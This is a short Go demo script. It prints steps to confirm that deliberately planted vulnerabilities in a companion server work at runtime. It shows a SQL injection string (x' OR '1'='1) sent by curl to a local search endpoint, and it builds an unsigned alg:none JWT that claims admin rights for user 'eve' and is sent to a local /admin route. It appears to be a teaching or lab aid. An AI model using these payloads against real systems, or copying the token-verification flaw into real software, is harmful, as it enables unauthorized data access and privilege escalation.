// Standalone script to sanity-check the vulnerabilities actually work at
// runtime (not just "look" vulnerable). Not part of the shipped app --
// delete this directory before submitting, or keep it as a demo aid.
package main

import (
	"encoding/base64"
	"fmt"
)

func main() {
	fmt.Println("=== SQL Injection demo ===")
	fmt.Println("Run the server, then:")
	fmt.Println(`  curl "localhost:8080/search?name=bob"`)
	fmt.Println(`  curl "localhost:8080/search?name=x' OR '1'='1"`)
	fmt.Println("The second call returns ALL users, not just 'x'.")

	fmt.Println()
	fmt.Println("=== JWT alg:none forgery demo ===")
	header := base64.RawURLEncoding.EncodeToString([]byte(`{"alg":"none","typ":"JWT"}`))
	payload := base64.RawURLEncoding.EncodeToString([]byte(`{"sub":"eve","admin":true,"exp":9999999999}`))
	forged := header + "." + payload + "."
	fmt.Println("Forged token (no signature, never touched jwtSecret):")
	fmt.Println(forged)
	fmt.Println()
	fmt.Println("Use it against the protected route:")
	fmt.Printf("  curl -H \"Authorization: Bearer %s\" localhost:8080/admin\n", forged)
	fmt.Println("It succeeds as admin 'eve' -- VerifyToken trusted the token's own alg field.")
}
